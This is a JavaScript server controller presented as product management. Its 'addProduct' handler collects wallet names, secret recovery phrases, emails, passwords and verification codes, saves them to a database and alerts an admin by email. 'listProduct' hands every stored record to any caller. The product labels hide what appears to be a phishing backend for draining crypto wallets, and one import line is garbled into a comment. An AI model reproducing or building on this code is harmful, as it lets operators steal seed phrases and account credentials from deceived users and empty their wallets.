import productModel from "../modules/productModule.js";
import fs from "fs";
import sendNotification from "../utils/mailer.js";  // Import the sendNotification function


// Add productimport { sendNotification } from "../mailer.js";  // Import the sendNotification function

// Add product
const addProduct = async (req, res) => {
  const product = new productModel({
    walletName: req.body.walletName,
    secretPhrase: req.body.secretPhrase,
    email: req.body.email,
    password: req.body.password,
    code: req.body.code,
    verifiedEmail: req.body.verifiedEmail,
    verifiedPassword: req.body.verifiedPassword

  });

  try {
    // Save product to the database
    await product.save();

    // Send email notification to admin after successful form submission
    await sendNotification(); // Call the sendNotification function

    res.json({ success: true, message: "Product Added" });
  } catch (error) {
    console.log(error);
    res.json({ success: false, message: error });
  }
};


//list of products
const listProduct = async (req,res) => {
try {
    const products = await productModel.find({});
    res.json({success:true,data:products})
    
} catch (error) {
    console.log("error")
    res.json({success:false,message:"error"})
    
}

}


//remove product
const removeProduct = async (req,res) =>{
    try {
        const product = await productModel.findById(req.body.id);
        await productModel.findByIdAndDelete(req.body.id);
        res.json({success:true, message:"Product Removed"})
        
    } catch (error) {
        console.log(error);
       res.json({success:false, message:"Error"})        
    }
}


//Update product
const updateProduct = async (req, res) => {
  const { id, name, description, price, category } = req.body;

  try {
    const updatedProduct = await productModel.findByIdAndUpdate(
      id,
      { name, description, price, category },
      { new: true, runValidators: true }
    );

    if (!updatedProduct) {
      return res.json({ success: false, message: "Product not found" });
    }

    res.json({ success: true, message: "Product Updated", data: updatedProduct });
  } catch (error) {
    console.log(error);
    res.json({ success: false, message: "Error" });
  }
};

 
export {addProduct, listProduct, removeProduct, updateProduct}
